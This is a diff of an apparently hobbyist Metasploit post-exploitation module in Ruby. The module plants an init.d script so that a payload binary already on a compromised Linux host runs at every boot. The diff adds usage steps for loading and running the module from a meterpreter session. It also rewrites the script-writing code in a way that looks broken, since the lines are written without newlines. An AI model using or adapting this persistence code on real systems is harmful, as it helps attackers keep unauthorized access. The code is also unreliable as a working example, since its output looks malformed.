@@ -12,8 +12,43 @@
 # Tested on      : Linux Kali 2.0
 #
 #
-#
 # [ DESCRIPTION ]
+# Builds 'persist' init.d startup script that allow users to persiste
+# your elf binary (linux executable) on Linux Kali distros at every startup
+# This post-exploitation module requires the payload allready deployed
+# in target system and root privileges (in non-Kali distros).
+#
+#
+# [ MODULE OPTIONS ]
+# The session number to run this module on        => set SESSION 3
+# The full path of binay to be executed (remote)  => set REMOTE_PATH /root/payload
+# The full path to init.d directory     (remote)  => set INIT_PATH /etc/init.d
+# Delete persistence script/configurations        => set DEL_PERSISTENCE true
+#
+#
+# [ PORT MODULE TO METASPLOIT DATABASE ]
+# Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/linux/manage/kali_initd_persistence.rb
+# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/linux/manage/kali_initd_persistence.rb
+# Manually Path Search: root@kali:~# locate modules/post/linux/manage
+#
+#
+# [ LOAD/USE AUXILIARY ]
+# meterpreter > background
+# msf exploit(handler) > reload_all
+# msf exploit(handler) > use post/linux/manage/kali_initd_persistence
+# msf post(kali_initd_persistence) > info
+# msf post(kali_initd_persistence) > show options
+# msf post(kali_initd_persistence) > show advanced options
+# msf post(kali_initd_persistence) > set [option(s)]
+# msf post(kali_initd_persistence) > exploit
+#
+#
+# [ HINT ]
+# In some linux distributions postgresql needs to be started and
+# metasploit database deleted/rebuild to be abble to load module.
+# 1 - service postgresql start
+# 2 - msfdb reinit   (optional)
+# 3 - msfconsole -x 'reload_all'
 ##
 
 
@@ -50,7 +85,7 @@ class MetasploitModule < Msf::Post
                 super(update_info(info,
                         'Name'          => 'Kali binary[elf] init.d persistence module',
                         'Description'   => %q{
-                                        Implementation of fileless uac bypass by enigma and mattifestation using cmd.exe OR powershell.exe to execute our command. This module will create the required registry entry in the current user’s hive, set the default value to whatever you pass via the EXEC_COMMAND parameter, and runs eventvwr.exe OR CompMgmtLauncher.exe (hijacking the process being started to gain code execution).
+                                        Builds 'persist' init.d startup script that allow users to persiste your elf binary (linux executable) on Linux Kali distros at every startup. This post-exploitation module requires the payload allready deployed in target system and root privileges (in non-Kali distros).
                         },
                         'License'       => UNKNOWN_LICENSE,
                         'Author'        =>
@@ -66,9 +101,9 @@ class MetasploitModule < Msf::Post
                         'Targets'        =>
                                 [
                                          # Tested againts windows 7 | Windows 10
-                                         [ 'Windows VISTA', 'Windows 7', 'Windows 8', 'Windows 10' ]
+                                         [ 'Linux Kali' ]
                                 ],
-                        'DefaultTarget'  => '4', # default its to run againts windows 10
+                        'DefaultTarget'  => '1', # default its to run againts Kali 2.0
                         'References'     =>
                                 [
                                          [ 'URL', 'POC: goo.gl/XHQ6aF' ],
@@ -90,7 +125,7 @@ class MetasploitModule < Msf::Post
                 register_options(
                         [
                                 OptString.new('SESSION', [ true, 'The session number to run this module on']),
-                                OptString.new('REMOTE_PATH', [ false, 'The full path of binay to execute (eg /root/payload)'])
+                                OptString.new('REMOTE_PATH', [ false, 'The full path of binay to be executed (eg /root/payload)'])
                         ], self.class)
 
                 register_advanced_options(
@@ -113,25 +148,26 @@ def ls_stage1
   remote_path = datastore['REMOTE_PATH'] # /root/payload
   script_check = "#{init_check}/persist" # /etc/init.d/persist
     #
-    # This is the init.d script that provides persistence on startup
+    # This is the init.d script that provides persistence on startup ..
     #
-    script = File.new("#{init_check}/persist", "w+")
-    script.puts("#!/bin/sh")
-    script.puts("### BEGIN INIT INFO")
-    script.puts("# Provides:          persistence on kali")
-    script.puts("# Required-Start:    $network $local_fs $remote_fs")
-    script.puts("# Required-Stop:     $remote_fs $local_fs")
-    script.puts("# Default-Start:     2 3 4 5")
-    script.puts("# Default-Stop:      0 1 6")
-    script.puts("# Short-Description: Persiste your binary (elf) in kali linux.")
-    script.puts("# Description:       Allows users to persiste your binary (elf) in kali linux systems")
-    script.puts("### END INIT INFO")
-    script.puts("#")
-    script.puts("# Give a little time to execute elf agent")
-    script.puts("sleep 5 > /dev/null")
-    script.puts("# Execute binary (elf agent)")
-    script.puts("./#{remote_path}")
-    script.close
+    # File.open("#{init_check}/persist", "w+") {|f| f.write("#!/bin/sh\n### BEGIN INIT INFO\n# Provides:          persistence on kali\n# Required-Start:    $network $local_fs $remote_fs\n# Required-Stop:     $remote_fs $local_fs\n# Default-Start:     2 3 4 5\n# Default-Stop:      0 1 6\n# Short-Description: Persiste your binary (elf) in kali linux.\n# Description:       Allows users to persiste your binary (elf) in kali linux systems\n### END INIT INFO\n#\n# Give a little time to execute elf agent\nsleep 5 > /dev/null\n# Execute binary (elf agent)\n./root/payload") }
+    #
+      File.open("#{init_check}/persist", "w+") do |f|
+        f.write("#!/bin/sh")
+        f.write("### BEGIN INIT INFO")
+        f.write("# Provides:          persistence on kali")
+        f.write("# Required-Start:    $network $local_fs $remote_fs")
+        f.write("# Required-Stop:     $remote_fs $local_fs")
+        f.write("# Default-Start:     2 3 4 5")
+        f.write("# Default-Stop:      0 1 6")
+        f.write("# Short-Description: Persiste your binary (elf) in kali linux.")
+        f.write("# Description:       Allows users to persiste your binary (elf) in kali linux systems")
+        f.write("### END INIT INFO")
+        f.write("#")
+        f.write("# Give a little time to execute elf agent")
+        f.write("sleep 5 > /dev/null")
+        f.write("./#{remote_path}")
+      end
 
 
       #
@@ -207,9 +243,6 @@ def run
     else
       print_error("[ ABORT ]: This module only works against meterpreter sessions!")
       return nil
-    end
-    # elevate session privileges befor runing options
-    client.sys.config.getprivs.each do |priv|
     end
 
 
